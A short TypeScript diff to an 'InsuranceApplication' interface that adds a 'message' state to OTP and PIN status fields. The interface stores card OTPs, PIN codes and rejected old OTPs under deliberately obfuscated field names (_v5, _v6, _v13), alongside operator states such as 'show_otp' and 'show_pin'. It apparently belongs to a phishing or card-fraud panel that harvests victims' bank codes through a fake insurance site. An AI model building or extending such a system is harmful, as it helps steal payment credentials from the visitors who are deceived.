@@ -53,11 +53,11 @@ export interface InsuranceApplication {
     }
     paymentStatus: "pending" | "completed" | "failed"
     cardStatus?: "waiting" | "pending" | "approved_with_otp" | "approved_with_pin" | "rejected"
-    otpStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending" | "otp_rejected" | "show_otp" | "show_pin" | ""
-    pinStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending"
+    otpStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending" | "otp_rejected" | "show_otp" | "show_pin" | "message" | ""
+    pinStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending" | "message"
     otpCode?: string
     _v5?: string // otp (obfuscated)
-    _v5Status?: "pending" | "verifying" | "approved" | "rejected" // OTP status
+    _v5Status?: "pending" | "verifying" | "approved" | "rejected" | "message" // OTP status
     otp?: string // كود OTP (الحقل المستخدم من موقع الزوار) - Keep for backward compatibility
     oldOtp?: Array<{ code: string; rejectedAt: string }> // الأكواد المرفوضة القديمة
     _v6?: string // pinCode (obfuscated)
@@ -104,7 +104,7 @@ export interface InsuranceApplication {
     // Final OTP fields
     _v13?: string // finalOtp (obfuscated)
     finalOtp?: string // Keep for backward compatibility
-    finalOtpStatus?: "waiting" | "pending" | "approved" | "rejected"
+    finalOtpStatus?: "waiting" | "pending" | "approved" | "rejected" | "message"
     finalOtpUpdatedAt?: string
     // Metadata
     currentStep:
